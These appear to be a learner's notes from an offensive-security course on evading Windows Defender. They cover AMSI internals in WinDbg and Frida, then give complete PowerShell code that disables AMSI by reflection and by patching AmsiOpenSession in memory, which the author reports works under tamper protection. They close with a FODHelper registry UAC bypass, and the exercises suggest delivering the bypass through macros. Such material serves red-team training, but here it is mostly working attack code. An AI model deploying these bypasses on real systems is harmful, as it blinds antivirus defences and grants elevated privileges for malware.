# Advanced Antivirus evasion

Some antivirus rely on cloud based resources and try to use AI to detect malicious behaviour

In this module, we’ll explore the impact of Windows Defender’s implementation of AMSI on 
PowerShell and Jscript. However, in order to do this, we must inspect the code at the assembly 
level. To that end, we’ll begin with an overview of assembly and then discuss the process of 
viewing code execution through the Windows Debugger.
32-bit (x86) and 64-bit (x86_64) versions of Windows 10. 
Although the differences between these versions may be subtle to the casual user, they are 
significant at the assembly level.

The stack typically stores the content of (higher-language) variables that are of static size and 
limited scope, whereas the heap is used for dynamic memory allocation and long-runtime 
persistent memory.
32-bit versions of Windows allocate 2GB of memory space to applications, ranging from the 
memory addresses 0 to 0x7FFFFFFF. 64-bit versions of Windows, on the other hand, support 
128TB (terabytes) of memory, ranging from 0 to 0x7FFFFFFFFFFF.

![](registers_x86_x64.png) 

The call343 assembly instruction transfers 
program execution to the address of the function and places the address to execute once the 
function is complete on the top of the stack where ESP (or RSP) is pointing. Once the function is 
complete, the ret344 instruction is executed, which fetches the return address from the stack and 
restores it to EIP/RIP.

 On a 32-bit architecture, the __stdcall345 calling convention reads all 
arguments from the stack. However, the 64-bit __fastcall346 calling convention expects the first 
four arguments in RCX, RDX, R8, and R9 (in that order) and the remaining arguments on the stack.

# windbg introduction

bp command followed by a memory address or the name of a function

setting a breakpoint with kernel32 function - 

`bp kernel32!writefile` 

`g` - to continue execution

`p` - to step through instructions one at a time

we can use unassemble

`u` for unassemble

so we can perform
`u rip L5`

we can view all registers with `r` command

`r rax`

we can look at the enrite memory area with 
`dd`, - 32 bit values 
`dc`, - 32 bit values with ASCII representation
`dq`  - 64 bit values

we can edit using 
`ed rsp 0`

### 7.1.1.1 Exercises
1. Open WinDbg and attach to a Notepad process.
2. Set a software breakpoint and trigger it.
3. Step through instructions and display register and memory content

```
00007ffe`647aaae5 8b442458        mov     eax,dword ptr [rsp+58h] ss:000000ff`4a6aead8=00000007
0:000> g
Breakpoint 0 hit
KERNEL32!WriteFile:
00007ffe`65994fd0 ff258ac00500    jmp     qword ptr [KERNEL32!_imp_WriteFile (00007ffe`659f1060)] ds:00007ffe`659f1060={KERNELBASE!WriteFile (00007ffe`647aaa50)}
0:000> u rip L5
KERNEL32!WriteFile:
00007ffe`65994fd0 ff258ac00500    jmp     qword ptr [KERNEL32!_imp_WriteFile (00007ffe`659f1060)]
00007ffe`65994fd6 cc              int     3
00007ffe`65994fd7 cc              int     3
00007ffe`65994fd8 cc              int     3
00007ffe`65994fd9 cc              int     3
0:000> r rip
rip=00007ffe65994fd0
```
# Anti malware scan interface

At a high level, 
AMSI captures every PowerShell, Jscript, VBScript, VBA, or .NET command or script at run-time 
and passes it to the local antivirus software for inspection.

The unmanaged dynamic link library AMSI.DLL is loaded into every PowerShell and 
PowerShell_ISE process and provides a number of exported functions that PowerShell takes 
advantage of.

# understanding AMSI

The AMSI exported APIs include AmsiInitialize, AmsiOpenSession, AmsiScanString, 
AmsiScanBuffer, and AmsiCloseSession.

When PowerShell is launched, it loads AMSI.DLL and calls AmsiInitialize, which takes two 
arguments as shown in the function prototype below:
```
HRESULT AmsiInitialize(
 LPCWSTR appName,
 HAMSICONTEXT *amsiContext
);
```
The first parameter is the name of the application and the second is a pointer to a context 
structure that is populated by the function. This context structure, named amsiContext, is used in 
every subsequent AMSI-related function.
Note that the call to AmsiInitialize takes place before we are able to invoke any PowerShell 
commands, which means we cannot influence it in any way.
Once AmsiInitialize is complete and the context structure is created, AMSI can parse the issued 
commands. When we execute a PowerShell command, the AmsiOpenSession358 API is called:
```
HRESULT AmsiOpenSession(
 HAMSICONTEXT amsiContext,
 HAMSISESSION *amsiSession
);
```
AmsiOpenSession accepts the amsiContext context structure and creates a session structure to 
be used in all calls within that session. This leads to the next two APIs that perform the actual 
captures.
AmsiScanString359 and AmsiScanBuffer360 can both be used to capture the console input or script 
content either as a string or as a binary buffer respectively

# Hooking with Frida

WinDbg breakpoints to trace the calls to the exported AMSI calls, but the Frida363
dynamic instrumentation framework offers a more flexible approach.

installing frida -

`pip install frida`

add the folder to you environement variable

```
C:\Users\misthios\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\Scripts
```

Then we can debug

```
>frida-trace -p 8464 -x amsi.dll -i Amsi*
```

Looking at AMSI

```
C:\Users\misthios>frida-trace -p 9592 -x amsi.dll -i Amsi*
Instrumenting...
AmsiOpenSession: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiOpenSession.js"
AmsiUninitialize: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiUninitialize.js"
AmsiScanBuffer: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiScanBuffer.js"
AmsiUacInitialize: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiUacInitialize.js"
AmsiInitialize: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiInitialize.js"
AmsiCloseSession: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiCloseSession.js"
AmsiScanString: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiScanString.js"
AmsiUacUninitialize: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiUacUninitialize.js"
AmsiUacScan: Auto-generated handler at "C:\\Users\\misthios\\__handlers__\\amsi.dll\\AmsiUacScan.js"
Started tracing 9 functions. Press Ctrl+C to stop.
           /* TID 0x24e4 */
116610 ms  AmsiCloseSession()
           /* TID 0x1268 */
116610 ms  AmsiOpenSession()
116610 ms  AmsiScanBuffer()
116720 ms  AmsiScanBuffer()
116735 ms  AmsiScanBuffer()
116751 ms  AmsiScanBuffer()
116751 ms  AmsiScanBuffer()
116751 ms  AmsiScanBuffer()
116767 ms  AmsiScanBuffer()
116767 ms  AmsiScanBuffer()
           /* TID 0x1e60 */
116798 ms  AmsiCloseSession()
           /* TID 0x1268 */
116798 ms  AmsiOpenSession()
116798 ms  AmsiScanBuffer()
```

We go to 
C:\Users\misthios\__handlers__\amsi.dll

and change the AmsiScanBuffer.js open process function as 

```
onEnter: function (log, args, state) {
 log('[*] AmsiScanBuffer()');
 log('|- amsiContext: ' + args[0]);
 log('|- buffer: ' + Memory.readUtf16String(args[1]));
 log('|- length: ' + args[2]);
 log('|- contentName ' + args[3]);
 log('|- amsiSession ' + args[4]);
 log('|- result ' + args[5] + "\n");
 this.resultPointer = args[5];
},
```

and onLeave function as

```
onLeave: function (log, retval, state) {
 log('[*] AmsiScanBuffer() Exit');
 resultPointer = this.resultPointer;
 log('|- Result value is: ' + Memory.readUShort(resultPointer) + "\n");
}
```

### 7.2.2.1 Exercises
1. Use Frida to trace innocent PowerShell commands and fill out the onEnter and onExit
JavaScript functions of AmsiScanBuffer to observe how the content is being passed.
2. Enter malicious commands and try to bypass AMSI detection by splitting strings into 
multiple parts.

done

# Bypassing AMSI refelction in powershell

we can drop in form of strings however it quickly becomes cat and mouse.

# What context mom ?

When we examined each of the AMSI Win32 APIs, we found that they all use the context structure 
that is created by calling AmsiInitialize. 

Since this context structure is undocumented, we will use Frida to locate its address in memory 
and then use WinDbg to inspect its content. As before, we will open a PowerShell prompt and a 
trace it with Frida. Then, we’ll enter another “test” string to obtain the address of the context 
structure

amsi context: 0x2c8cc81d510

`dc address`

000002c8`cc81d510  49534d41 00000000 cc84db40 000002c8  AMSI....@.......
000002c8`cc81d520  c95e5410 000002c8 00000d62 00000000  .T^.....b.......
000002c8`cc81d530  00000000 00000000 c9c080fe 90000b00  ................
000002c8`cc81d540  cc81d540 000002c8 c94e7340 000002c8  @.......@sN.....
000002c8`cc81d550  cc81dbe0 000002c8 c94e7a61 000002c8  ........azN.....
000002c8`cc81d560  00000000 00000020 c9cf80fb 90000c00  .... ...........
000002c8`cc81d570  cc81d570 000002c8 c94e7b20 000002c8  p....... {N.....
000002c8`cc81d580  c94d6980 000002c8 c94e7341 000002c8  .iM.....AsN.....

`u amsi!AmsiOpenSession`

00007ffc`e9b63840 e9c3c81914      jmp     00007ffc`fdd00108
00007ffc`e9b63845 4885c9          test    rcx,rcx
00007ffc`e9b63848 7442            je      amsi!AmsiOpenSession+0x4c (00007ffc`e9b6388c)
00007ffc`e9b6384a 8139414d5349    cmp     dword ptr [rcx],49534D41h
00007ffc`e9b63850 753a            jne     amsi!AmsiOpenSession+0x4c (00007ffc`e9b6388c)
00007ffc`e9b63852 4883790800      cmp     qword ptr [rcx+8],0
00007ffc`e9b63857 7433            je      amsi!AmsiOpenSession+0x4c (00007ffc`e9b6388c)
00007ffc`e9b63859 4883791000      cmp     qword ptr [rcx+10h],0

``

we go to the place where AMSI is defined and then

```
0:014> bp amsi!AmsiOpenSession
```
```
0:014> g
Breakpoint 0 hit
amsi!AmsiOpenSession:
00007fff`c75c24c0 e943dcdb0b jmp 00007fff`d3380108
```
```
0:006> dc rcx L1
000001f8`62fa6f40 49534d41 AMSI
```
```
0:006> ed rcx 0
```
```
0:006> dc rcx L1
000001f8`62fa6f40 00000000 ....
````
```
0:006> g
```
then `amsiutils`

this requires manual intervention

### instead lets go for non manual implementation of stopping amsi directlyform powershell.

`$a=[Ref].Assembly.GetTypes()`

`Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}`

`$c.GetFields('NonePublic,Static')`

```
PS C:\Users\WIN10RED> $c.GetFields('NonPublic,Static')


Name                   : amsiContext
MetadataToken          : 67114382
FieldHandle            : System.RuntimeFieldHandle
Attributes             : Private, Static
FieldType              : System.IntPtr
MemberType             : Field
ReflectedType          : System.Management.Automation.AmsiUtils
DeclaringType          : System.Management.Automation.AmsiUtils
Module                 : System.Management.Automation.dll
IsPublic               : False
IsPrivate              : True
IsFamily               : False
IsAssembly             : False
IsFamilyAndAssembly    : False
IsFamilyOrAssembly     : False
IsStatic               : True
IsInitOnly             : False
IsLiteral              : False
IsNotSerialized        : False
IsSpecialName          : False
IsPinvokeImpl          : False
IsSecurityCritical     : True
IsSecuritySafeCritical : False
IsSecurityTransparent  : False
CustomAttributes       : {}

Name                   : amsiSession
MetadataToken          : 67114383
FieldHandle            : System.RuntimeFieldHandle
Attributes             : Private, Static
FieldType              : System.IntPtr
MemberType             : Field
ReflectedType          : System.Management.Automation.AmsiUtils
DeclaringType          : System.Management.Automation.AmsiUtils
Module                 : System.Management.Automation.dll
IsPublic               : False
IsPrivate              : True
IsFamily               : False
IsAssembly             : False
IsFamilyAndAssembly    : False
IsFamilyOrAssembly     : False
IsStatic               : True
IsInitOnly             : False
IsLiteral              : False
IsNotSerialized        : False
IsSpecialName          : False
IsPinvokeImpl          : False
IsSecurityCritical     : True
IsSecuritySafeCritical : False
IsSecurityTransparent  : False
CustomAttributes       : {}

Name                   : amsiInitFailed
MetadataToken          : 67114384
FieldHandle            : System.RuntimeFieldHandle
Attributes             : Private, Static
FieldType              : System.Boolean
MemberType             : Field
ReflectedType          : System.Management.Automation.AmsiUtils
DeclaringType          : System.Management.Automation.AmsiUtils
Module                 : System.Management.Automation.dll
IsPublic               : False
IsPrivate              : True
IsFamily               : False
IsAssembly             : False
IsFamilyAndAssembly    : False
IsFamilyOrAssembly     : False
IsStatic               : True
IsInitOnly             : False
IsLiteral              : False
IsNotSerialized        : False
IsSpecialName          : False
IsPinvokeImpl          : False
IsSecurityCritical     : True
IsSecuritySafeCritical : False
IsSecurityTransparent  : False
CustomAttributes       : {}

Name                   : amsiLockObject
MetadataToken          : 67114385
FieldHandle            : System.RuntimeFieldHandle
Attributes             : Private, Static
FieldType              : System.Object
MemberType             : Field
ReflectedType          : System.Management.Automation.AmsiUtils
DeclaringType          : System.Management.Automation.AmsiUtils
Module                 : System.Management.Automation.dll
IsPublic               : False
IsPrivate              : True
IsFamily               : False
IsAssembly             : False
IsFamilyAndAssembly    : False
IsFamilyOrAssembly     : False
IsStatic               : True
IsInitOnly             : False
IsLiteral              : False
IsNotSerialized        : False
IsSpecialName          : False
IsPinvokeImpl          : False
IsSecurityCritical     : True
IsSecuritySafeCritical : False
IsSecurityTransparent  : False
CustomAttributes       : {}
```

```
PS C:\Users\Offsec> $d=$c.GetFields('NonPublic,Static')
PS C:\Users\Offsec> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
PS C:\Users\Offsec> $f.GetValue($null)
3061447775504
```
converting to hex:
0x2C8CC81D510

one liner to remove AMSI

```
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

This script is blocked by windows defender.

need to remove tamper protection for it to run.

still didnt work

![](amsi_bypass_not_working.png)  


### 7.3.1.1 Exercises
1. Inspect the amsiContext structure to locate the AMSI header using Frida and WinDbg.
2. Manually modify the amsiContext structure in WinDbg and ensure AMSI is bypassed.
3. Replicate the .NET reflection to dynamically locate the amsiContext field and modify it.

# wreaking amsi in powershell

In the last section, we used reflection to locate vital structures and variables that, when corrupted, 
will cause AMSI to be disabled. In this section, we’ll modify the assembly instructions themselves 
instead of the data they are acting upon in a technique known as binary patching. We can use this 
technique to hotpatch the code and force it to fail even if the data structure is valid.

# understanding the assembly flow

dumping the contents of AmsiOpenSession

```
0:011> u amsi!AmsiOpenSession L1A
```
output

```
amsi!AmsiOpenSession:
00007ffa`1778d980 4885d2          test    rdx,rdx
00007ffa`1778d983 743f            je      amsi!AmsiOpenSession+0x44 (00007ffa`1778d9c4)
00007ffa`1778d985 4885c9          test    rcx,rcx
00007ffa`1778d988 743a            je      amsi!AmsiOpenSession+0x44 (00007ffa`1778d9c4)
00007ffa`1778d98a 4883790800      cmp     qword ptr [rcx+8],0
00007ffa`1778d98f 7433            je      amsi!AmsiOpenSession+0x44 (00007ffa`1778d9c4)
00007ffa`1778d991 4883791000      cmp     qword ptr [rcx+10h],0
00007ffa`1778d996 742c            je      amsi!AmsiOpenSession+0x44 (00007ffa`1778d9c4)
00007ffa`1778d998 41b801000000    mov     r8d,1
00007ffa`1778d99e 418bc0          mov     eax,r8d
00007ffa`1778d9a1 f00fc14118      lock xadd dword ptr [rcx+18h],eax
00007ffa`1778d9a6 4103c0          add     eax,r8d
00007ffa`1778d9a9 4898            cdqe
00007ffa`1778d9ab 488902          mov     qword ptr [rdx],rax
00007ffa`1778d9ae 7510            jne     amsi!AmsiOpenSession+0x40 (00007ffa`1778d9c0)
00007ffa`1778d9b0 418bc0          mov     eax,r8d
00007ffa`1778d9b3 f00fc14118      lock xadd dword ptr [rcx+18h],eax
00007ffa`1778d9b8 4103c0          add     eax,r8d
00007ffa`1778d9bb 4898            cdqe
00007ffa`1778d9bd 488902          mov     qword ptr [rdx],rax
00007ffa`1778d9c0 33c0            xor     eax,eax
00007ffa`1778d9c2 c3              ret
00007ffa`1778d9c3 cc              int     3
00007ffa`1778d9c4 b857000780      mov     eax,80070057h
00007ffa`1778d9c9 c3              ret
00007ffa`1778d9ca cc              int     3
```

We are trying to modify test rdx, rdx with xor rax, rax

we want to make minimum modification as possible

### 7.4.1.1 Exercises
1. Follow the analysis in WinDbg and locate the TEST and conditional jump instruction.
2. Search for any other instructions inside AmsiOpenSession that could be overwritten just as 
easily to achieve the same goal

done above

# patching the internals

To implement the attack, we’ll need to perform three actions. We’ll obtain the memory address of 
AmsiOpenSession, modify the memory permissions where AmsiOpenSession is located, and 
modify the three bytes at that location.

we have been provided a lookup function to find out the base address of amsi dll.

```
function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName))
}
```
we can use this function like any other win32 API to locate the amsi opensession by opening a 64 bit instance of powershell_ise and executing the following code.

```
function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName))
}
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$funcAddr
```

To verify this address, we’ll open WinDbg, attach to the PowerShell_ISE process and quickly 
translate the address to hexadecimal with the ? command, prepending the address with 0n

```
? 0n140706668796288
```


```s
0:027> ? 0n140712112347520
Evaluate expression: 140712112347520 = 00007ffa`1778d980
```

```
u 00007ff8`d302d980
```

```
amsi!AmsiOpenSession:
00007ff8`d302d980 4885d2          test    rdx,rdx
00007ff8`d302d983 743f            je      amsi!AmsiOpenSession+0x44 (00007ff8`d302d9c4)
00007ff8`d302d985 4885c9          test    rcx,rcx
00007ff8`d302d988 743a            je      amsi!AmsiOpenSession+0x44 (00007ff8`d302d9c4)
00007ff8`d302d98a 4883790800      cmp     qword ptr [rcx+8],0
00007ff8`d302d98f 7433            je      amsi!AmsiOpenSession+0x44 (00007ff8`d302d9c4)
00007ff8`d302d991 4883791000      cmp     qword ptr [rcx+10h],0
00007ff8`d302d996 742c            je      amsi!AmsiOpenSession+0x44 (00007ff8`d302d9c4)
```

In Windows, all memory is divided into 0x1000-byte pages.
379 A memory protection setting is 
applied to each page, describing the permissions of data on that page.
Normally, code pages are set to PAGE_EXECUTE_READ, or 0x20,380 which means we can read and 
execute this code, but not write to it. This obviously presents a problem.
Let’s verify this in WinDbg with !vprot,
381 which displays memory protection information for a 
given memory address:

```
!vprot 00007ff8`d302d980
BaseAddress:       00007ff8d302d000
AllocationBase:    00007ff8d3020000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000000008000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE
```

we can overwrite the bytest on this page by using the vitual protect api

creating a module to call virtual protect

```
function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {
 Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
 return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], 
[UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
```

after doing this, we find that

```
0:025> !vprot 00007ff8`d302d980
BaseAddress:       00007ff8d302d000
AllocationBase:    00007ff8d3020000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000000001000
State:             00001000  MEM_COMMIT
Protect:           00000080  PAGE_EXECUTE_WRITECOPY
Type:              01000000  MEM_IMAGE
```

However, the new memory protection is set to PAGE_EXECUTE_WRITECOPY instead of 
PAGE_EXECUTE_READWRITE. In order to conserve memory, Windows shares AMSI.DLL between 
processes that use it. PAGE_EXECUTE_WRITECOPY is equivalent to 
PAGE_EXECUTE_READWRITE but it is a private copy used only in the current process

We can use the Copy385 method from the System.Runtime.InteropServices namespace to copy the 
assembly instruction (XOR RAX,RAX) represented as 0x48, 0x31, 0xC0 from a managed array 
($buf) to unmanaged memory

```ps1
$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
```

we can also now restore the memory address to covver our tracks

```
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

the entire code together then for amsi bypass


```
function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {
 Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
 return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], 
[UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)


```

this works even with cloud protect and tamper protection

### 7.4.2.1 Exercises
1. Recreate the bypass shown in this section by both entering the commands directly in the 
command prompt and by downloading and executing them as a PowerShell script from your 
Kali Linux Apache web server.
2. Incorporate this bypass into a VBA macro where PowerShell is launched through WMI to 
bypass both the Windows Defender detection on the Microsoft Word document and the 
AMSI-based detection.

### 7.4.2.2 Extra Mile Exercise
Create a similar AMSI bypass but instead of modifying the code of AmsiOpenSession, find a 
suitable instruction to change in AmsiScanBuffer and implement it from reflective PowerShell.

# UAC bypass vs Microsoft Defender

 This case study leverages a UAC386 bypass that abuses the 
Fodhelper.exe application.

# FODHelper UAC bypass

FODHelper tries to access
`HKCU:\Software\Classes\ms-settings\shell\open\command`

If our exploit creates the registry path and sets the (Default) value to an executable (like powershell.exe), it will be spawned as a high integrity process when Fodhelper is started.

simulated in this powershell code

(while running this this somehow disabled the visutal windows security app)
```
 New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force 

C:\Windows\System32\fodhelper.exe
```

The first command creates the registry path through the New-Item cmdlet388 and the -Path
option. Additionally, it sets the value of the default key to “powershell.exe” through the -Value
option while the -Force flag suppresses any warnings.

In the second command, the DelegateExecute value is created through the similar New-ItemProperty cmdlet,389 again using the -Path option along with the -Name option to specify the 
value and the -PropertyType option to specify the type of value, in this case a String.

Finally, fodhelper.exe is started to launch the high-integrity PowerShell prompt

Based on the highlighted section of Figure 89, the PowerShell prompt is running in high integrity.
This is obviously only a simple proof-of-concept but it has been weaponized by exploitation 
frameworks including Metasploit so let’s test it out.





















